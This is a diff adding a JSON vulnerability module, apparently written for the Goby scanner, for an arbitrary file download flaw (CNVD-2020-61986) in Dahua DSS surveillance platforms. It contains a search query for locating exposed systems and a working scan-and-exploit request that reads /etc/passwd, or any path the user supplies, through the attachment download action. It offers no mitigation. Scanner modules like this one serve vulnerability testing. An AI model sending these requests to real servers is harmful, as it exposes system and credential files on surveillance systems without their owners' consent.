@@ -1,0 +1,101 @@
+{
+      "Name": "Zhejiang Dahua DSS System Filedownload CNVD-2020-61986",
+      "Level": "1",
+      "Tags": [
+            "filedownload"
+      ],
+      "GobyQuery": "title=\"DSS-平安城市\"",
+      "Description": "Zhejiang Dahua DSS (digital surveillance system) is a comprehensive management platform that integrates the management functions of four security subsystems: video, alarm, access control and intercom.",
+      "Product": "Zhejiang Dahua DSS (digital surveillance system)",
+      "Homepage": "https://www.dahuatech.com/",
+      "Author": "",
+      "Impact": "Zhejiang Dahua DSS System FIledownload.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2020-61986"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "file",
+                  "Type": "input",
+                  "Value": "/etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file://{{{file}}}",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
